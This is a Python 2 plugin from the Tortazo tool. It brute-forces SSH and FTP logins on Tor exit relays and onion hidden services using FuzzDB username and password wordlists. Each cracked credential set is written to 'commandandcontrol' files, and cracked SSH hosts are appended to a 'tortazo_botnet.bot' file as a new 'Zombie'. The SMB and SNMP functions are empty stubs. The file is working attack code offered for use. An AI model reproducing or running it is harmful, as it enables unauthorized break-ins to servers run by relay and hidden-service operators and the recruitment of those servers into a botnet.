# coding=utf-8
'''
Created on 22/01/2014

#Author: Adastra.
#twitter: @jdaanial

bruterPlugin.py

bruterPlugin is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

bruterPlugin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Tortazo; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
'''

from core.tortazo.pluginManagement.BasePlugin import BasePlugin
from stem.version import Version
from prettytable import PrettyTable
import paramiko
import ftplib
import os
import sys
from smb.SMBConnection import SMBConnection
import logging as log
from socket import error as socket_error

class bruterPlugin(BasePlugin):
    '''
    Class to  implement a bruteforce plugin against TOR exit nodes and hidden services in the deep web.
    '''

    def __init__(self, torNodes=[]):
        BasePlugin.__init__(self, torNodes, 'bruterPlugin')
        self.setPluginDetails('bruterPlugin', "Bruteforce plugin for services in the deep web. TIP: If you run this plugin in SSH Brute force mode, don't activate the -v/..verbose. If you use that option, you'll see a lot of debug message traced by Paramiko library.", '1.0', 'Adastra: @jdaanial')
        if len(torNodes) > 0:
            self.info("[*] bruterPlugin Initialized!")
        self.bruteForceData = {}
        for torNode in self.torNodes:
            openPorts = []
            for port in torNode.openPorts:
                openPorts.append(port.port)
                if len(openPorts) > 0:
                    self.bruteForceData[torNode.host] = openPorts
        self.separator = ":"


    def __del__(self):
        if len(self.torNodes) > 0:
            self.info("[*] bruterPlugin Destroyed!")

    def setDictSeparator(self, separator):
        print "[+] Setting separator '%s' for dictionary files. Every line en the file must contain <user><separator><passwd>" %(separator)
        self.separator = separator

    ################################################################################################################################################
    ###########################FUNCTIONS TO PERFORM SSH BRUTEFORCE ATTACKS.#########################################################################
    ################################################################################################################################################
    def sshBruterOnRelay(self, relay, port=22, dictFile=None, force=False):
        self.unsetSocksProxy()
        if self.bruteForceData.has_key(relay) == False and force==False:
            print "[-] IP Adress %s not found in the relays. If you want to run the scan against this host, use the parameter 'force=True' of this function" %(relay)
            return
        if force == False and port not in self.bruteForceData[relay]:
            print "[-] Port %s in the selected relay is 'closed' in the information recorded in database. If you think that it's really open, use the parameter 'force=True' of this function" %(str(port))
            return

        print "[+] Starting SSH BruteForce mode against %s on port %s" %(relay, str(port))

        if dictFile is None:
            print "[+] No specified 'dictFile'. Using FuzzDB Project to execute the attack."
            usersList = self.getUserlistFromFuzzDB()
            passList = self.getPasslistFromFuzzDB()
            stop_attack = False
            for user in usersList:
                if stop_attack:
                    break
                for passwd in passList:
                    try:
                        if self.performSSHConnection(relay, port, user, passwd):
                            stop_attack = True
                            break
                    except:
                        print "[-] Captured exception. Finishing attack."
                        return
        else:
            print "[+] Using the 'dictFile' stored in %s. Verifing the file. " %(dictFile)
            if os.path.exists(dictFile) == False or os.path.isfile(dictFile) == False:
                print "[-] The file selected doesn't exists or is a directory."
                return
            for line in open(dictFile, "r").readlines():
                [user, passwd] = line.strip().split(self.separator)
                try:
                    if self.performSSHConnection(relay, port, user, passwd):
                        break
                except:
                    print "[-] Captured exception. Finishing attack."
                    return

            
    def sshBruterOnAllRelays(self, port=22, dictFile=None, force=False):
        for relay in self.bruteForceData:
            self.sshBruterOnRelay(relay=relay, port=port, dictFile=dictFile, force=force)

    def sshBruterOnHiddenService(self, onionService, port=22, dictFile=None):
        if len(onionService) != 22 and onionService.endswith('.onion') == False:
            print "[-] Invalid Onion Adress %s must contain 16 characters. The TLD must be .onion" %(onionService)
            return

        print "[+] Starting SSH BruteForce mode against %s on port %s" %(onionService, str(port))
        if dictFile is None:
            print "[+] No specified 'dictFile'. Using FuzzDB Project to execute the attack."
            usersList = self.getUserlistFromFuzzDB()
            passList = self.getPasslistFromFuzzDB()
            stop_attack = False
            for user in usersList:
                if stop_attack:
                    break
                for password in passList:
                    try:
                        if self.performSSHConnectionHiddenService(onionService, port, user, password):
                            stop_attack = True
                            break
                    except socket_error as serr:
                        print serr
                        print "Connection Refused... Exiting."
                        return
        else:
            print "[+] Using the 'dictFile' stored in %s. Verifing the file. " %(dictFile)
            if os.path.exists(dictFile) == False or os.path.isfile(dictFile) == False:
                print "[-] The dictFile selected doesn't exists or is a directory."
                return
            for line in open(dictFile, "r").readlines():
                [user, password] = line.strip().split(self.separator)
                try:
                    if self.performSSHConnectionHiddenService(onionService, port, user, password):
                        break
                except socket_error as serr:
                    print "Connection Refused... Finishing the attack."
                    return



    ################################################################################################################################################
    ###########################FUNCTIONS TO PERFORM FTP BRUTEFORCE ATTACKS.#########################################################################
    ################################################################################################################################################
    def ftpBruterOnRelay(self, host, port=21, dictFile=None, proxy=False):
        '''
        This function is invoked by ftpBruterOnAllRelays and ftpBruterOnHiddenService.
        For this reason there's no checks to see if the host is stored in database. The user could enter the address for an onion service and this is perfectly valid.
        '''
        if proxy:
            self.setSocksProxy()
        else:
            self.unsetSocksProxy()

        print "[+] Bruteforce on service %s " %(host)
        ftpFileName = 'commandandcontrolftp.txt'
        print "[+] Trying Anonymous access in: %s " %(host)
        if self.anonymousFTPAccess(host,port):
            return

        if dictFile is not None and os.path.exists(dictFile):
            print "[+] Reading the Passwords file %s " %(dictFile)
            for line in open(dictFile, "r").readlines():
                [user, passwd] = line.strip().split(self.separator)
                try :
                    if self.performFTPConnection(host,port, user=user, passwd=passwd):
                        break
                except Exception as excep:
                    print "[-] Captured exception. Finishing attack."
                    print sys.exc_info()
                    return
        else:
            print "[+] No specified 'dictFile'. Using FuzzDB Project to execute the attack."
            usersList = self.getUserlistFromFuzzDB()
            passList = self.getPasslistFromFuzzDB()

            try :
                for user in usersList:
                    #Same user and password are valid?
                    if self.performFTPConnection(host,port, user=user, passwd=user):
                        break
                    for passwd in passList:
                        if self.performFTPConnection(host,port, user=user, passwd=passwd):
                            return
            except Exception as excep:
                print "[-] Captured exception. Finishing attack."
                print sys.exc_info()
                return


    def ftpBruterOnAllRelays(self, relay, port=21, dictFile=None):
        for relay in self.bruteForceData:
            self.ftpBruterOnRelay(relay, port=port, dictFile=dictFile)
        

    def ftpBruterOnHiddenService(self, onionService, port=21, dictFile=None):
        self.setSocksProxy()
        self.ftpBruterOnRelay(onionService,port=port, dictFile=dictFile, proxy=True)


    ################################################################################################################################################
    ###########################FUNCTIONS TO PERFORM SNMP BRUTEFORCE ATTACKS.########################################################################
    ################################################################################################################################################
    def snmpBruterOnRelay(self, relay, dictFile=None):
        '''
        TOR only works on TCP, and typically SNMP works on UDP, so teorically you cann't configure an SNMP Service as Hidden Service.
        '''
        self.unsetSocksProxy()
        if dictFile is None:
            print "[+] No specified 'dictFile', using FuzzDB Project to execute the attack."

    def snmpBruterOnAllRelays(self, relay, port, dictFile=None):
        for relay in self.bruteForceData:
            self.snmpBruterOnRelay(relay, port=port, dictFile=dictFile)

    ################################################################################################################################################
    ###########################FUNCTIONS TO PERFORM SMB BRUTEFORCE ATTACKS.#########################################################################
    ################################################################################################################################################
    def smbBruterOnRelay(self, relay, dictFile=None):
        self.unsetSocksProxy()
        if dictFile is None:
            print "[+] No specified 'dictFile', using FuzzDB Project to execute the attack."
            

    def smbBruterOnAllRelays(self, dictFile=None):
        if dictFile is None:
            print "[+] No specified 'dictFile', using FuzzDB Project to execute the attack."

    def smbBruterOnHiddenService(self, onionService, dictFile=None):
        if dictFile is None:
            print "[+] No specified 'dictFile', using FuzzDB Project to execute the attack."

    ################################################################################################################################################
    ###########################   COMMON FUNCTIONS.   ##############################################################################################
    ################################################################################################################################################

    def anonymousFTPAccess(self,host, port):
        try:
            ftpFileName = 'commandandcontrolftp.txt'
            ftpClient = ftplib.FTP()
            ftpClient.connect(host, port)
            ftpClient.login()
            print "[+] Anonymous access allowed in: %s Go for it!" %(host)
            ftpFile = open(ftpFileName, 'a')
            entry = '%s:%s:%s' %(host, 'anonymous', 'anonymous')
            ftpFile.write(entry+'\n')
            ftpFile.close()
        except:
            print "[-] Anonymous access is not allowed in: %s "%(host)
            return False
        return True

    def performFTPConnection(self, host, port, user, passwd):
        ftpFileName = 'commandandcontrolftp.txt'
        try :
            sessionFtp = ftplib.FTP()
            sessionFtp.connect(host=host, port=port)
            success = sessionFtp.login(user, passwd)
            if success:
                ftpFile = open(ftpFileName, 'a')
                print "[+] FTP Bruteforce Success ... username: %s and passoword %s are VALID! " % (user, passwd)
                sessionFtp.quit()
                sessionFtp.close()
                entry = '%s:%s:%s' %(host, user, passwd)
                ftpFile.write(entry+'\n')
                ftpFile.close()
                return True
        except ftplib.socket.gaierror as sockerror:
            print "An error ocurred. See the full trace: "
            print sys.exc_info()
            raise sockerror
        except ftplib.all_errors, e:
            errorcode_string = str(e).split(None, 1)
            print errorcode_string
            if errorcode_string[0] == '530':
                if "Login" in errorcode_string[1]:
                    return False


    def performSSHConnection(self, host, port, user, passwd):
        '''
        Perform SSH Connections using the tortazo_botnet.bot file.
        '''
        self.cli.logger.basicConfig(format="%(levelname)s: %(message)s", level=log.WARN)
        tortazoFile = os.getcwd()+'/tortazo_botnet.bot'
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        sshFileName = 'commandandcontrolssh.txt'
        try:
            client.connect(host, port, username=user, password=passwd)
        except paramiko.AuthenticationException:
            return False
        except paramiko.SSHException as sshExc:
            print "Seems that the SSH Service is not running. Please, check that before running the bruteforce attack."
            raise sshExc
        except Exception as exc:
            print "An error ocurred. See the full trace: "
            print sys.exc_info()
            raise exc
        if client:
            print "[+] SSH Bruteforce Success ... username: %s and password %s are VALID! " % (user, passwd)
            client.close()
            sshFileName = os.getcwd()+'/commandandcontrolssh.txt'
            if os.path.exists(sshFileName) == False:
                sshFile = open(sshFileName, 'w')
            else:
                sshFile = open(sshFileName, 'a')
            entry =  '%s:%s:%s' %(host, user, passwd)
            sshFile.write(entry+'\n')
            sshFile.close()
            print "[+] Updating the file 'tortazo_botnet.bot' with the new Zombie"
            if os.path.exists(tortazoFile) == False:
                tortazoFd = open(tortazoFile, 'w')
            else:
                tortazoFd = open(tortazoFile, 'a')
            #host:user:pass:port:nickname
            nickname = '--'
            for torNode in self.torNodes:
                if torNode.host == host:
                    nickname = torNode.nickName
                    break
            entryBotnet = '%s:%s:%s:%s:%s' %(host, user, passwd, port, nickname)
            content = open(tortazoFile, 'r').readlines()
            if entryBotnet in content:
                print "[-] Entry duplicated. Server already added in the 'tortazo_botnet.bot' file"
            else:
                tortazoFd.write(entryBotnet+'\n')
                print "[+] Entry %s added" %(entry)
                tortazoFd.close()
            return True

    def performSSHConnectionHiddenService(self, onionService, port, user, passwd):
        self.cli.logger.basicConfig(format="%(levelname)s: %(message)s", level=self.cli.logger.ERROR)
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        proxyCommand = os.getcwd()+'/plugins/bruteforce/utils/connect-socks -S '+self.socksHost+':'+str(self.socksPort)+' '+onionService+' '+str(port)
        proxy = paramiko.ProxyCommand(proxyCommand)
        try:
            # IF Hidden Service is incorrect: SSHException: Error reading SSH protocol banner
            # IF Bad user/passwd: AuthenticationException:
            # IF Bad Proxy: ProxyCommandFailure:

            client.connect(onionService, port, username=user, password=passwd, sock=proxy)
        except paramiko.AuthenticationException:
            return False
        except paramiko.ProxyCommandFailure as proxyExc:
            print "Proxy Failure. The settings used are: Host=%s and Port=%s. Check your TOR Socks proxy if you haven't used the options -T and -U." %(self.socksHost,self.socksPort)
            raise proxyExc
        except paramiko.SSHException as sshExc:
            print "Seems that the Hidden Service is not running. Please, check that before running the bruteforce attack."
            raise sshExc
        except Exception as exc:
            print "An error ocurred. See the full trace: "
            print sys.exc_info()
            raise exc

        if client:
            print "[+] SSH Bruteforce Success ... username: %s and password %s are VALID! " % (user, passwd)
            sshFileName = os.getcwd()+'/commandandcontrolssh.txt'
            if os.path.exists(sshFileName) == False:
                sshFile = open(sshFileName, 'w')
            else:
                sshFile = open(sshFileName, 'a')
            entry =  '%s:%s:%s' %(onionService, user, passwd)
            sshFile.write(entry+'\n')
            sshFile.close()
            client.close()

    def getUserlistFromFuzzDB(self):
        '''
        Reads:
        fuzzdb/wordlists-user-passwd/names/namelist.txt
        fuzzdb/wordlists-user-passwd/passwds/john.txt
        fuzzdb/wordlists-user-passwd/unix-os/unix-users.txt
        fuzzdb/wordlists-user-passwd/faithwriters.txt
        and returns a list of words (used as possible usernames)
        '''
        print "[+] Generating users list using the files in FuzzDB"
        users = []
        try:
            namelist = open('fuzzdb/wordlists-user-passwd/names/namelist.txt', 'r')
            johnlist = open('fuzzdb/wordlists-user-passwd/passwds/john.txt', 'r')
            unixusers = open('fuzzdb/wordlists-user-passwd/unix-os/unix_users.txt', 'r')
            faithwriters = open('fuzzdb/wordlists-user-passwd/faithwriters.txt', 'r')
        except:
            print sys.exc_info()

        for userNameList in namelist.readlines():
            users.append(userNameList)

        for userJohnList in johnlist.readlines():
            users.append(userJohnList)

        for userunix in unixusers.readlines():
            users.append(userunix)

        for userfaithwriter in faithwriters.readlines():
            users.append(userfaithwriter)
        return users

    def getPasslistFromFuzzDB(self):
        '''
        Reads:
        fuzzdb/wordlists-user-passwd/passwds/john.txt
        fuzzdb/wordlists-user-passwd/unix-os/unix-passwords.txt
        fuzzdb/wordlists-user-passwd/weaksauce.txt
        and returns a list of words (used as possible usernames)
        '''
        print "[+] Generating passwords list using the files in FuzzDB"
        passwords = []
        johnlist = open('fuzzdb/wordlists-user-passwd/passwds/john.txt', 'r')
        unixpasswords = open('fuzzdb/wordlists-user-passwd/unix-os/unix_passwords.txt', 'r')
        weaksauce = open('fuzzdb/wordlists-user-passwd/passwds/weaksauce.txt', 'r')
        for johnpass in johnlist.readlines():
            passwords.append(johnpass)

        for unixpass in unixpasswords.readlines():
            passwords.append(unixpass)

        for wealsauce in weaksauce.readlines():
            passwords.append(wealsauce)

        return passwords
    
        
    def help(self):
        print "[*] Functions availaible available in the Plugin..."
        tableHelp = PrettyTable(["Function", "Description", "Example"])
        tableHelp.padding_width = 1
        tableHelp.padding_width = 1
        tableHelp.add_row(['help', 'Help Banner', 'self.help()'])
        tableHelp.add_row(['printRelaysFound', 'Table with the relays found.', 'self.printRelaysFound()'])
        tableHelp.add_row(['setDictSeparator', 'Sets an separator for dictionary files. Every line en the file must contain <user><separator><passwd>.', 'self.setDictSeparator(":")'])
        tableHelp.add_row(['sshBruterOnRelay', 'Execute a bruteforce attack against an SSH Server in the relay entered. Uses FuzzDB if the dictFile is not specified.', "self.sshBruterOnRelay('37.213.43.122', dictFile='/home/user/dict')"])
        tableHelp.add_row(['sshBruterOnAllRelays', 'Execute a bruteforce attack against an SSH Server in the relays founded. Uses FuzzDB if the dictFile is not specified.', "self.sshBruterOnAllRelays(dictFile='/home/user/dict')"])
        tableHelp.add_row(['sshBruterOnHiddenService', 'Execute a bruteforce attack against an SSH Server in the onion address entered.', 'self.sshBruterOnHiddenService("5bsk3oj5jufsuii6.onion", dictFile="/home/user/dict")'])
        print tableHelp
